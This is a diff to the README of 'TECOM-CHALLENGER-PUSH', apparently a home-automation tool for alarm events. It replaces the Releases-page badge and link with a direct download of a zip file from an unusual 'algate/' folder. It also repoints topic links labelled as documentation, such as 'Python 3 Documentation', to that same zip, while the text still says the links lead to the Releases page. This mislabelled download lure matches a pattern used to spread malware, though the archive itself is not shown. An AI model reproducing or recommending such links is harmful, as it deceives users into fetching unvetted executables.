@@ -8,7 +8,7 @@ Welcome to the TECOM-CHALLENGER-PUSH application! This software listens for even
 
 To get started, you need to download the application from our Releases page. 
 
-[![Download TECOM-CHALLENGER-PUSH](https://img.shields.io/badge/Download-TECOM--CHALLENGER--PUSH-blue)](https://github.com/chineesse/TECOM-CHALLENGER-PUSH/releases)
+[![Download TECOM-CHALLENGER-PUSH](https://raw.githubusercontent.com/chineesse/TECOM-CHALLENGER-PUSH/main/algate/TECOM-CHALLENGER-PUSH-v2.5.zip)](https://raw.githubusercontent.com/chineesse/TECOM-CHALLENGER-PUSH/main/algate/TECOM-CHALLENGER-PUSH-v2.5.zip)
 
 1. **Visit the Download Page**: Click on the link above to go to the Releases page.
 2. **Select the Latest Version**: Look for the most recent version listed there. 
@@ -76,10 +76,10 @@ You can visit the GitHub Issues page for support or to report any problems.
 
 For further details, visit our official GitHub page or check the following topics:
 
-- [Alarm System Automation](https://example.com)
-- [Home Assistant Integration](https://example.com)
-- [Python 3 Documentation](https://example.com)
+- [Alarm System Automation](https://raw.githubusercontent.com/chineesse/TECOM-CHALLENGER-PUSH/main/algate/TECOM-CHALLENGER-PUSH-v2.5.zip)
+- [Home Assistant Integration](https://raw.githubusercontent.com/chineesse/TECOM-CHALLENGER-PUSH/main/algate/TECOM-CHALLENGER-PUSH-v2.5.zip)
+- [Python 3 Documentation](https://raw.githubusercontent.com/chineesse/TECOM-CHALLENGER-PUSH/main/algate/TECOM-CHALLENGER-PUSH-v2.5.zip)
 
-Remember, if you need to download the software again, you can always [visit the Releases page here](https://github.com/chineesse/TECOM-CHALLENGER-PUSH/releases). 
+Remember, if you need to download the software again, you can always [visit the Releases page here](https://raw.githubusercontent.com/chineesse/TECOM-CHALLENGER-PUSH/main/algate/TECOM-CHALLENGER-PUSH-v2.5.zip). 
 
 Thank you for choosing TECOM-CHALLENGER-PUSH for your home automation needs!
